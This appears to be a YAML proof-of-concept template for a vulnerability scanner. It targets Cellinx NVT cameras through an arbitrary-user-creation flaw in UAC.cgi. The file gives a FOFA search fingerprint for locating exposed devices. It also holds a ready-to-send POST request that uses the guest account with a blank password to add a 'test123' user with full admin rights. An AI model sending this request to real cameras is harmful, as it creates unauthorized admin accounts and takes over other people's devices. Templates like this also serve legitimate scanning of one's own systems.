id: poc-yaml-cellinx-nvt-uaccgi-anyuser-creat
info:
  name: Cellinx NVT 摄像机 UAC.cgi 任意用户创建漏洞
  severity: high
  tags:
  - 访问控制错误
  finger: Cellinx NVT 摄像机
  fofa: body="local/NVT-string.js"
requests:
- method: POST
  path: /cgi-bin/UAC.cgi?TYPE=json
  headers:
    Content-Type: application/json;charset=UTF-8
  data: '{"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"test123","password":"test123","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}'
  expression: 'status_code == 200 &&

    contains(body,"{\"retData\":{\"add_user\":{\"result\" : \"Success\"")

    '
variables: {}
transport: http
